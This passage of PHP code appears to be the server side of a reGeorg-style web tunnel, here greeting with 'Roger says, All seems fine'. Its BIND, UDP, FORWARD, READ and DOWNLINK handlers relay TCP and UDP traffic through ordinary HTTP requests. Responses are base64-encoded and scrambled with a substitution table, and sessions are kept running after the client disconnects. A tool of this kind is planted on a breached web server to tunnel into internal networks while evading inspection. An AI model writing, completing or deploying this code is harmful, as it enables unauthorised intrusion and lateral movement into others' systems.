                        roger_file_put_bool_unlocked($runfile, false);
                        roger_control_update_unlocked($controlfile, array("run" => false));
                        roger_lock_release($stateLock);
                        return;
                    }
                    stream_socket_shutdown($res, STREAM_SHUT_WR);
                    $stateLock = roger_lock_acquire($lockfile);
                    roger_file_put_bool_unlocked($shutdownackfile, true);
                    roger_lock_release($stateLock);
                }
                stream_set_blocking($res, false);
                $markRemoteEof = false;
                if (!$remoteEof) {
                    while (($o = fread($res, $sessionReadbuf)) !== false && $o !== "") {
                        if($o === false)
                        {
                            $stateLock = roger_lock_acquire($lockfile);
                            roger_file_put_bool_unlocked($runfile, false);
                            roger_control_update_unlocked($controlfile, array("run" => false));
                            roger_lock_release($stateLock);
                            return;
                        }
                        $readBuff .= $o;
                        if ( strlen($readBuff) > $sessionMaxread ) {
                            break;
                        }
                    }
                    if (feof($res)) {
                        $markRemoteEof = true;
                    }
                }
                if (strlen($readBuff) > 0 || $markRemoteEof){
                    $stateLock = roger_lock_acquire($lockfile);
                    if (strlen($readBuff) > 0) {
                        roger_file_append_unlocked($readfile, $readBuff);
                    }
                    $deferFullClose = $markRemoteEof && !$sessionHalfClose && strlen($readBuff) == 0 && $hasWrite;
                    if ($markRemoteEof && !$deferFullClose) {
                        roger_file_append_unlocked($eoffile, "1");
                        roger_file_put_bool_unlocked($remoteeoffile, true);
                        roger_control_update_unlocked($controlfile, array("remote_eof" => true));
                        if (!$sessionHalfClose && strlen($readBuff) == 0) {
                            roger_file_put_bool_unlocked($runfile, false);
                            roger_control_update_unlocked($controlfile, array("run" => false));
                        }
                    }
                    roger_lock_release($stateLock);
                }
            }
            fclose($res);
        }
            @header_remove('set-cookie');
        break;
    case "BIND":
        {
            $sessionSettings = roger_settings_from_info($info);
            roger_save_settings_values($settings, $sessionSettings);
            $sessionReadbuf = $sessionSettings["readbuf"];
            $sessionMaxread = $sessionSettings["maxread"];
            $sessionHalfClose = $sessionSettings["halfclose"];
            set_time_limit(0);
            $address = $info[$IP];
            $port = $info[$PORT];
            
            $server_socket = stream_socket_server("tcp://" . $address . ":" . $port, $errno, $errstr);
            if (!$server_socket) {
               $rinfo[$STATUS] = 'FAIL';
               $rinfo[$ERROR] = "Could not create socket|CODE:" . $errno . "|MSG:" . $errstr;
               break;
            }
            ignore_user_abort(true);
            $stateLock = roger_lock_acquire($lockfile);
            roger_file_clear($readfile);
            roger_file_clear($eoffile);
            roger_file_clear($tcpwritefile);
            roger_lock_release($stateLock);

            $client_socket = stream_socket_accept($server_socket, -1);
            stream_set_blocking($client_socket, false);
            $client_ip = stream_socket_get_name($client_socket, true);

            $stateLock = roger_lock_acquire($lockfile);
            roger_file_put_bool_unlocked($runfile, true);
            roger_file_put_unlocked($commandfile, "BIND");
            roger_file_put_unlocked($peerfile, $client_ip);
            roger_file_put_bool_unlocked($shutdownfile, false);
            roger_file_put_bool_unlocked($shutdownackfile, false);
            roger_file_put_bool_unlocked($remoteeoffile, false);
            roger_file_put_bool_unlocked($remoteeofsentfile, false);
            roger_control_save_unlocked($controlfile, true, "BIND", $client_ip, false, false, $sessionHalfClose);
            roger_lock_release($stateLock);

            while (true) {
                $stateLock = roger_lock_acquire($lockfile);
                $running = roger_file_bool_unlocked($runfile);
                $shutdownWrite = roger_file_take_bool_unlocked($shutdownfile);
                $remoteEof = roger_file_bool_unlocked($remoteeoffile);
                $writeBuff = roger_file_take_unlocked($tcpwritefile);
                $hasWrite = $writeBuff != "";
                roger_lock_release($stateLock);
                if (!$running) {
                    break;
                }

                if (!$remoteEof && feof($client_socket)) {
                    $stateLock = roger_lock_acquire($lockfile);
                    if ($sessionHalfClose) {
                        roger_file_put_bool_unlocked($remoteeoffile, true);
                        roger_control_update_unlocked($controlfile, array("remote_eof" => true));
                    } else {
                        roger_file_put_bool_unlocked($runfile, false);
                        roger_control_update_unlocked($controlfile, array("run" => false));
                    }
                    if (!$sessionHalfClose) {
                        roger_lock_release($stateLock);
                        break;
                    }
                    $remoteEof = true;
                    roger_lock_release($stateLock);
                }
                if (!$hasWrite) {
                    usleep(50000);
                }
        
                $readBuff = "";
                if ($writeBuff != "" && roger_write_all($client_socket, $writeBuff) === false) {
                    $stateLock = roger_lock_acquire($lockfile);
                    roger_file_put_bool_unlocked($runfile, false);
                    roger_control_update_unlocked($controlfile, array("run" => false));
                    roger_lock_release($stateLock);
                    break;
                }
                if ($shutdownWrite) {
                    if (roger_drain_pending_tcp_before_shutdown($client_socket, $tcpwritefile, $lockfile) === false) {
                        $stateLock = roger_lock_acquire($lockfile);
                        roger_file_put_bool_unlocked($runfile, false);
                        roger_control_update_unlocked($controlfile, array("run" => false));
                        roger_lock_release($stateLock);
                        break;
                    }
                    stream_socket_shutdown($client_socket, STREAM_SHUT_WR);
                    $stateLock = roger_lock_acquire($lockfile);
                    roger_file_put_bool_unlocked($shutdownackfile, true);
                    roger_lock_release($stateLock);
                }
                $markRemoteEof = false;
                if (!$remoteEof) {
                    while (($o = fread($client_socket, $sessionReadbuf)) !== false && $o !== "") {
                        if($o === false)
                        {
                            $stateLock = roger_lock_acquire($lockfile);
                            roger_file_put_bool_unlocked($runfile, false);
                            roger_control_update_unlocked($controlfile, array("run" => false));
                            roger_lock_release($stateLock);
                            break;
                        }
                        $readBuff .= $o;
                        if ( strlen($readBuff) > $sessionMaxread ) {
                            break;
                        }
                    }
                    if (feof($client_socket)) {
                        $markRemoteEof = true;
                    }
                }
                if (strlen($readBuff) > 0 || $markRemoteEof){
                    $stateLock = roger_lock_acquire($lockfile);
                    if (strlen($readBuff) > 0) {
                        roger_file_append_unlocked($readfile, $readBuff);
                    }
                    $deferFullClose = $markRemoteEof && !$sessionHalfClose && strlen($readBuff) == 0 && $hasWrite;
                    if ($markRemoteEof && !$deferFullClose) {
                        roger_file_append_unlocked($eoffile, "1");
                        roger_file_put_bool_unlocked($remoteeoffile, true);
                        roger_control_update_unlocked($controlfile, array("remote_eof" => true));
                        if (!$sessionHalfClose && strlen($readBuff) == 0) {
                            roger_file_put_bool_unlocked($runfile, false);
                            roger_control_update_unlocked($controlfile, array("run" => false));
                        }
                    }
                    roger_lock_release($stateLock);
                }
            }
    
            $stateLock = roger_lock_acquire($lockfile);
            roger_file_clear($tcpwritefile);
            roger_file_clear($runfile);
            roger_file_clear($shutdownfile);
            roger_file_clear($shutdownackfile);
            if (!$sessionHalfClose) {
                roger_file_clear($readfile);
                roger_file_clear($eoffile);
                roger_file_clear($commandfile);
                roger_file_clear($peerfile);
                roger_file_clear($remoteeoffile);
                roger_file_clear($remoteeofsentfile);
                roger_file_clear($controlfile);
            } else {
                roger_control_update_unlocked($controlfile, array("run" => false));
            }
            roger_lock_release($stateLock);
            fclose($client_socket);
            fclose($server_socket);
        }
        @header_remove('set-cookie');
        break;
    case "UDP":
        {
            $sessionSettings = roger_settings_from_info($info);
            roger_save_settings_values($settings, $sessionSettings);
            $sessionMaxread = $sessionSettings["maxread"];
            $sessionUdpfrag = $sessionSettings["udpfrag"];
            $sessionUdpTimeout = $sessionSettings["udptimeout"];
            set_time_limit(0);
            $address = $info[$IP];
            $port = $info[$PORT];
            $socket = stream_socket_server("udp://".$address.":".$port, $errno, $errstr, STREAM_SERVER_BIND);
            if ($socket === false) 
            {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = "Could not create socket|CODE:" . $errno . "|MSG:" . $errstr;
                break;
            }

            stream_set_blocking($socket, false);
            ignore_user_abort(true);

            $stateLock = roger_lock_acquire($lockfile);
            roger_file_put_bool_unlocked($runfile, true);
            roger_file_put_unlocked($commandfile, "UDP");
            roger_file_put_unlocked($peerfile, "");
            roger_file_clear($udpwritefile);
            roger_file_clear($udppacketfile);
            roger_file_clear($udpinfile);
            roger_file_put_unlocked($udppeerfile, "");
            roger_file_put_unlocked($udpactivityfile, strval(time()));
            roger_control_save_unlocked($controlfile, true, "UDP", "", false, false, false);
            roger_lock_release($stateLock);

            while (true)
            {
                $stateLock = roger_lock_acquire($lockfile);
                $running = roger_file_bool_unlocked($runfile);
                $hasWrite = file_exists($udpwritefile) && filesize($udpwritefile) > 0;
                $writePeer = roger_file_get_unlocked($udppeerfile, "");
                $lastActivity = intval(roger_file_get_unlocked($udpactivityfile, strval(time())));
                $writeBuff = roger_file_take_unlocked($udpwritefile);
                roger_lock_release($stateLock);
                if (!$running) {
                    break;
                }
                if (time() - $lastActivity > $sessionUdpTimeout) {
                    $stateLock = roger_lock_acquire($lockfile);
                    roger_file_put_bool_unlocked($runfile, false);
                    roger_control_update_unlocked($controlfile, array("run" => false));
                    roger_lock_release($stateLock);
                    break;
                }
                if (!$hasWrite) {
                    usleep(50000);
                }

                $readBuff = "";
                if ($writeBuff != "")
                {
                    stream_set_blocking($socket, false);
                    $i = stream_socket_sendto($socket, $writeBuff, 0, $writePeer);
                    if($i === false)
                    {
                        $stateLock = roger_lock_acquire($lockfile);
                        roger_file_put_bool_unlocked($runfile, false);
                        roger_control_update_unlocked($controlfile, array("run" => false));
                        roger_lock_release($stateLock);
                        return;
                    }
                    $stateLock = roger_lock_acquire($lockfile);
                    roger_file_put_unlocked($udpactivityfile, strval(time()));
                    roger_lock_release($stateLock);
                }
                stream_set_blocking($socket, false);
                while (($res = stream_socket_recvfrom($socket, 65497, 0, $packetPeer)) !== false && $res !== "")
                {
                    if($res === false)
                    {
                        $stateLock = roger_lock_acquire($lockfile);
                        roger_file_put_bool_unlocked($runfile, false);
                        roger_control_update_unlocked($controlfile, array("run" => false));
                        roger_lock_release($stateLock);
                        return;
                    }
                    $stateLock = roger_lock_acquire($lockfile);
                    roger_file_put_unlocked($udpactivityfile, strval(time()));
                    foreach (roger_udp_fragment_payload($res, $sessionUdpfrag) as $fragment) {
                        roger_file_append_unlocked($udppacketfile, roger_udp_queue_pack($fragment["data"], $fragment["meta"], $packetPeer));
                    }
                    roger_udp_queue_trim_unlocked($udppacketfile, $sessionMaxread);
                    roger_lock_release($stateLock);
                }
            }
            fclose($socket);
        }
        @header_remove('set-cookie');
        break;
    case "DISCONNECT":
        {
            $stateLock = roger_lock_acquire($lockfile);
            roger_file_clear($readfile);
            roger_file_clear($eoffile);
            roger_file_clear($runfile);
            roger_file_clear($tcpwritefile);
            roger_file_clear($commandfile);
            roger_file_clear($peerfile);
            roger_file_clear($shutdownfile);
            roger_file_clear($shutdownackfile);
            roger_file_clear($remoteeoffile);
            roger_file_clear($remoteeofsentfile);
            roger_file_clear($udpwritefile);
            roger_file_clear($udppacketfile);
            roger_file_clear($udpinfile);
            roger_file_clear($udppeerfile);
            roger_file_clear($udpactivityfile);
            roger_file_clear($controlfile);
            roger_lock_release($stateLock);
        }
        break;
    case "CHECK": 
        {
            $stateLock = roger_lock_acquire($lockfile);
            $commandValue = roger_file_get_unlocked($commandfile, "");
            $address = $commandValue == "UDP" ? roger_file_get_unlocked($udppeerfile, "") : roger_file_get_unlocked($peerfile, "");
            roger_lock_release($stateLock);
            $rinfo[$STATUS] = 'OK';
            $rinfo[$IP] = "";
            $rinfo[$PORT] = "";
            if ($address != "") {
                $address = roger_split_peer($address);
                $rinfo[$IP] = $address[0];
                $rinfo[$PORT] = $address[1];
            }
            @header_remove('set-cookie');
        }
        break;
    case "DOWNLINK":
        {
            $streamingResponse = true;
            $responseSettings = roger_session_settings($settings);
            roger_stream_headers();
            $sessionSeen = false;
            $missingSessionPolls = 0;
            $lastHeartbeat = microtime(true);
            $heartbeatInterval = 5.0;
            $sessionHalfClose = $responseSettings["halfclose"];
            $sessionMaxread = $responseSettings["maxread"];

            while (true) {
                $stateLock = roger_lock_acquire($lockfile);
                $controlState = roger_control_state_unlocked($controlfile);
                $running = $controlState["run"];
                $commandValue = $controlState["command"];
                $peerValue = $controlState["peer"];
                $remoteEof = $controlState["remote_eof"] || file_exists($eoffile);
                $remoteEofSent = $controlState["remote_eof_sent"];
                $sessionHalfClose = $responseSettings["halfclose"] || $controlState["halfclose"];
                $readBuffer = "";
                $packet = null;
                $consumePacket = false;
                $markRemoteEofSent = false;
                $closeAfterReadBuffer = false;
                if ($commandValue != "") {
                    $sessionSeen = true;
                }

                if ($commandValue == "UDP") {
                    $packet = roger_udp_queue_peek_unlocked($udppacketfile);
                    $consumePacket = $packet != null;
                } else if ($commandValue != "UDP") {
                    $readBuffer = roger_file_take_limit_unlocked($readfile, $sessionMaxread);
                    if (!$sessionHalfClose && $remoteEof) {
                        $closeAfterReadBuffer = true;
                    }
                }

                $sendRemoteEof = $commandValue != "UDP" && $sessionHalfClose && $remoteEof && !$remoteEofSent && strlen($readBuffer) == 0;
                if ($sendRemoteEof) {
                    $markRemoteEofSent = true;
                }

                if ($consumePacket || $markRemoteEofSent || $closeAfterReadBuffer) {
                    if ($markRemoteEofSent) {
                        roger_file_put_bool_unlocked($remoteeofsentfile, true);
                        roger_control_update_unlocked($controlfile, array("remote_eof_sent" => true));
                        roger_file_clear($eoffile);
                    }
                    if ($closeAfterReadBuffer) {
                        roger_file_put_bool_unlocked($runfile, false);
                        roger_control_update_unlocked($controlfile, array("run" => false));
                        roger_file_clear($eoffile);
                    }
                    if ($consumePacket && $packet != null) {
                        roger_udp_queue_take_unlocked($udppacketfile);
                    }
                }
                roger_lock_release($stateLock);
                $frame = array();
                if (!$sessionSeen && !$running && $commandValue == "" && $missingSessionPolls < 20) {
                    $missingSessionPolls++;
                    $frame[$STATUS] = "OK";
                    $frame[$CMD] = "HEARTBEAT";
                } else if ($commandValue == "UDP" && $packet != null) {
                    $frame[$STATUS] = "OK";
                    $frame[$CMD] = "DATA";
                    $frame[$DATA] = $packet["data"];
                    if ($packet["meta"] != "") {
                        $frame[$UDPFRAG] = $packet["meta"];
                    }
                    $address = roger_split_peer($packet["peer"]);
                    $frame[$IP] = $address[0];
                    $frame[$PORT] = $address[1];
                } else if (strlen($readBuffer) > 0) {
                    $frame[$STATUS] = "OK";
                    $frame[$CMD] = "DATA";
                    $frame[$DATA] = $readBuffer;
                } else if ($sendRemoteEof) {
                    $frame[$STATUS] = "OK";
                    $frame[$CMD] = "SHUT_WR";
                } else if ($running) {
                    if (microtime(true) - $lastHeartbeat < $heartbeatInterval) {
                        usleep(50000);
                        continue;
                    }
                    $frame[$STATUS] = "OK";
                    $frame[$CMD] = "HEARTBEAT";
                    $lastHeartbeat = microtime(true);
                    if ($commandValue == "UDP" && $peerValue != "") {
                        $address = roger_split_peer($peerValue);
                        $frame[$IP] = $address[0];
                        $frame[$PORT] = $address[1];
                    }
                } else {
                    $frame[$STATUS] = "FAIL";
                    $frame[$ERROR] = "Session is closed";
                }

                roger_stream_write($frame, $responseSettings["servercomp"], $responseSettings["serverlimit"], $en, $de);

                $sentRemoteEof = isset($frame[$CMD]) && $frame[$CMD] == "SHUT_WR";
                $sessionClosed = $frame[$STATUS] != "OK";
                if ($sentRemoteEof || $sessionClosed) {
                    break;
                }
                usleep(50000);
            }
            exit;
        }
        break;
    case "READ":
        {
            $stateLock = roger_lock_acquire($lockfile);
            $controlState = roger_control_state_unlocked($controlfile);
            $readBuffer = roger_file_take_unlocked($readfile);
            $running = $controlState["run"];
            $commandValue = $controlState["command"];
            $peerValue = $commandValue == "UDP" ? roger_file_get_unlocked($udppeerfile, "") : $controlState["peer"];
            $remoteEof = $controlState["remote_eof"] || file_exists($eoffile);
            $sessionHalfClose = false;
            if ($commandValue != "UDP") {
                $readSettings = roger_session_settings($settings);
                $sessionHalfClose = $readSettings["halfclose"] || $controlState["halfclose"];
            }
            $packet = null;
            if ($commandValue == "UDP") {
                $packet = roger_udp_queue_take_unlocked($udppacketfile);
            }
            roger_lock_release($stateLock);
            if ($running || $readBuffer != "" || $packet != null) {
                $rinfo[$STATUS] = 'OK';
                if ($commandValue == "UDP" && $packet != null) {
                    $rinfo[$DATA] = $packet["data"];
                    if ($packet["meta"] != "") {
                        $rinfo[$UDPFRAG] = $packet["meta"];
                    }
                    $address = roger_split_peer($packet["peer"]);
                    $rinfo[$IP] = $address[0];
                    $rinfo[$PORT] = $address[1];
                } else {
                    $rinfo[$DATA] = $readBuffer;
                    if ($sessionHalfClose && $remoteEof) {
                        $rinfo[$CMD] = "SHUT_WR";
                    }
                }
                if ($commandValue == "UDP" && $packet == null && $peerValue != "") {
                    $address = roger_split_peer($peerValue);
                    $rinfo[$IP] = $address[0];
                    $rinfo[$PORT] = $address[1];
                }
                header("Connection: Keep-Alive");
            } else {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'Session is closed';
            }
        }
        break;
    case "FORWARD": {
            $stateLock = roger_lock_acquire($lockfile);
            $running = roger_file_bool_unlocked($runfile);
            if(!$running){
                roger_lock_release($stateLock);
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'Session is closed';
                break;
            }
            $rawPostData = $info[$DATA];
            if ($rawPostData) {
                $commandValue = roger_file_get_unlocked($commandfile, "");
                if ($commandValue == "UDP") {
                    $udpPeer = $info[$IP] . ":" . $info[$PORT];
                    roger_file_put_unlocked($udppeerfile, $udpPeer);
                    roger_control_update_unlocked($controlfile, array("peer" => $udpPeer));
                    $meta = isset($info[$UDPFRAG]) ? $info[$UDPFRAG] : "";
                    roger_file_put_unlocked($udpactivityfile, strval(time()));
                    list($complete, $packetData) = roger_udp_reassemble_file_unlocked($udpinfile, $rawPostData, $meta);
                    if ($complete && $packetData !== "") {
                        roger_file_append_unlocked($udpwritefile, $packetData);
                    }
                } else {
                    roger_file_append_unlocked($tcpwritefile, $rawPostData);
                }
                roger_lock_release($stateLock);
                $rinfo[$STATUS] = 'OK';
                header("Connection: Keep-Alive");
            } else {
                roger_lock_release($stateLock);
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'POST data parse error';
            }
        }
        break;
    case "SHUT_WR": {
            $sessionSettings = roger_session_settings($settings);
            $controlState = roger_control_state($controlfile);
            if (!$sessionSettings["halfclose"] && !$controlState["halfclose"]) {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'Half-close mode is disabled';
                break;
            }
            $stateLock = roger_lock_acquire($lockfile);
            $running = roger_file_bool_unlocked($runfile);
            if ($running) {
                roger_file_put_bool_unlocked($shutdownackfile, false);
                roger_file_put_bool_unlocked($shutdownfile, true);
            }
            roger_lock_release($stateLock);
            if ($running) {
                for ($i = 0; $i < 20; $i++) {
                    if (roger_file_bool($shutdownackfile)) {
                        break;
                    }
                    usleep(50000);
                }
            }
            if ($running) {
                $rinfo[$STATUS] = 'OK';
                header("Connection: Keep-Alive");
            } else {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'Session is closed';
            }
        }
        break;
    default: {
        $sayhello = true;
    }
}
if ($streamingResponse) {
    exit;
}
if ( $sayhello ) {
    echo base64_decode(strtr("Roger says, 'All seems fine'", $de, $en));
} else {
    $responseSettings = roger_session_settings($settings);
    echo strtr(base64_encode(blv_encode($rinfo, $responseSettings["servercomp"], $responseSettings["serverlimit"])), $en, $de);
}
